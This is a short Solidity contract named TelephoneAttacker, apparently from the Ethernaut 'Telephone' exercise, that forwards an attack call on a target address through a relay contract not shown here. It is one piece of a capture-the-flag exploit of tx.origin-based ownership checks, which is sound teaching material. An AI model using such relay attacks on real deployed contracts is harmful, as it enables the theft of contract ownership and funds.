// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface relayInterface {
    function attack(address _targetAddress) external;
}

contract TelephoneAttacker {
    relayInterface relay;

    constructor(address relayAddress) {
        relay = relayInterface(relayAddress);
    }

    function attack(address targetAddress) public {
        relay.attack(targetAddress);
    }
}
